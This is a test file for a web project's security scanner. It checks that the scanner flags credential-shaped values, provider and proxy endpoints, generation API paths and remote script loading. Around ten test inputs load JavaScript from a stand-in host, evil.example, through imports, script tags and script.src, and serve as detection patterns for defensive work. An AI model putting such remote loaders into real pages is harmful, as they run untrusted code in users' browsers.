import { describe, expect, it } from 'vitest';

import { isScannableTextPath, scanText } from '../../scripts/lib/security-scanner.mjs';

const credential = ['fixture', 'credential', '0123456789abcdef'].join('');
const skCredential = ['s', 'k-', credential].join('');
const base64Credential = ['YWJjZGVmZ2hpamtsbW5vcA', '+/=='].join('');

describe('security scanner', () => {
  it.each([
    ['quoted JSON key', `{"api_key":"${credential}"}`],
    ['dotenv unquoted value', `API_KEY=${credential}`],
    ['YAML unquoted value', `api-key: ${credential}`],
    ['backtick value', `const token = \`${credential}\``],
    ['Bearer credential', `Authorization: Bearer ${credential}`],
    ['sk credential', `const credential = '${skCredential}'`],
    ['base64 credential', `{"api_key":"${base64Credential}"}`],
  ])('detects a credential-shaped %s', (_kind, text) => {
    expect(scanText('tools/media/fixture.txt', text)).toContain('tools/media/fixture.txt: credential-shaped value');
  });

  it('allows empty and explicitly redacted environment examples', () => {
    expect(scanText('.env.example', 'PIE_API_KEY=\nTOKEN=<redacted>\nSECRET=your_secret_here\n')).toEqual([]);
  });

  it.each([
    'https://api.pie-xian.com/v1/videos',
    'https://x666.me/v1/images/generations',
    'https://closeapi.top/v1/images/generations',
    'https://api.piapi.ai/v1/videos',
    'const adapter = HHHlClient',
    'http://grok-responses.internal/v1/responses',
    'https://wallhaven.cc/api/v1/search',
    'https://corsproxy.io/?url=https://example.com',
    'https://api.allorigins.win/raw?url=https://example.com',
    'https://api.codetabs.com/v1/proxy?quest=https://example.com',
  ])('rejects runtime provider or proxy marker %s', (text) => {
    expect(scanText('src/runtime-client.ts', text)).toContain('src/runtime-client.ts: runtime provider endpoint');
    expect(scanText('tools/media/client.ts', text)).not.toContain('tools/media/client.ts: runtime provider endpoint');
  });

  it.each([
    '/v1/images/generations',
    '/v1/images/edits',
    '/v1/audio/speech',
    'generateImage(request)',
    'createVideoGeneration(request)',
  ])('rejects runtime generation path or symbol %s', (text) => {
    expect(scanText('dist/albina-galgame-card/source/runtime.js', text)).toContain(
      'dist/albina-galgame-card/source/runtime.js: runtime generation API',
    );
  });

  it('normalizes runtime path case and JSON-escaped generation URLs', () => {
    const path = 'Src/runtime-client.ts';
    const text = String.raw`{"endpoint":"https:\/\/provider.example\/v1\/images\/generations"}`;
    expect(scanText(path, text)).toContain(`${path}: runtime generation API`);
  });

  it.each([
    "import('https://evil.example/payload.js')",
    "import 'https://evil.example/payload.js'",
    "script.src = 'https://evil.example/payload.js'",
    '<script src="https://evil.example/payload.js"></script>',
    "import('https://evil.example/extensionless')",
    "import('https://evil.example/payload.mjs')",
    "script.src = '//evil.example/payload.js'",
    "document.createElement('script').src = 'https://evil.example/extensionless'",
    "script.setAttribute('src', 'https://evil.example/extensionless')",
    String.raw`{"loader":"https:\/\/evil.example\/payload.js"}`,
  ])('rejects arbitrary remote executable JavaScript: %s', (text) => {
    expect(scanText('card/fixture.json', text)).toContain('card/fixture.json: untrusted remote executable JavaScript');
  });

  it('allows only the exact immutable Albina loader and canonical asset URLs in runtime files', () => {
    const base = 'https://cdn.jsdelivr.net/gh/q18718859808-sketch/albina-galgame-card@v2.0.0-rc.4/dist/albina-galgame-card';
    expect(scanText('card/albina.card.json', `script.src='${base}/source/albina-classic-loader.js'`)).toEqual([]);
    expect(scanText('src/media.ts', `image.src='${base}/assets/cg/opening_rain.jpg'; audio.src='${base}/assets/audio/bgm/title.mp3'`)).toEqual([]);
    expect(scanText('dist/albina-galgame-card/manifest.json', `{"asset":"${base}/assets/cg/opening_rain.jpg"}`)).toEqual([]);
    expect(scanText('card/albina.card.json', "script.src='https://cdn.jsdelivr.net/npm/other/index.js'"))
      .toContain('card/albina.card.json: untrusted remote executable JavaScript');
  });

  it.each([
    'src/runtime.cjs',
    'src/runtime.jsx',
    'src/policy.xml',
    'src/Makefile',
  ])('scans credential-capable text path %s', (path) => {
    expect(isScannableTextPath(path)).toBe(true);
  });

  it('rejects production progress metadata from either release tree', () => {
    for (const path of [
      'dist/albina-galgame-card/assets/sprite-atlas/_progress.json',
      'release/github-cdn-root/dist/albina-galgame-card/assets/sprite-atlas/_progress.json',
    ]) {
      expect(scanText(path, '{}')).toContain(`${path}: production progress in web release`);
    }
  });
});
